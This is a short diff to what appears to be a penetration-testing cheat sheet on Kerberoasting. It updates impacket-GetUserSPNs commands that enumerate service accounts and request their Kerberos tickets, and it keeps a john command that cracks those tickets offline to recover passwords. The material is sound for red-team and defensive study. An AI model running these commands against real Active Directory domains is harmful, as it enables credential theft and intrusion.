@@ -8,14 +8,16 @@ When a user wants to access a resource hosted by a _Service Principal Name_ (SPN
 
 The TGS is encrypted using the SPN's password hash. Having TGS, we can try to crack it offline and recover the service account password. This is the _Kerberoasting_ attack.
 
+> **NOTE**: Domain names should be kept in FQDN format!
+
 Linux:
 
 ```bash
 # Get list of kerberoastable users from DC
-impacket-GetUserSPNs $domain/$user:$pass -dc-ip $dc_ip
+impacket-GetUserSPNs $domain_fqdn/$user:$pass -dc-ip $dc_ip
 
 # Request TGS for kerberoastable users
-impacket-GetUserSPNs $domain/$user:$pass -dc-ip $dc_ip -request
+impacket-GetUserSPNs $domain_fqdn/$user:$pass -dc-ip $dc_ip -request -outputfile $file
 
 # Crack TGS using John
 john --format=krb5tgs --wordlist=$wordlist $tgs_file
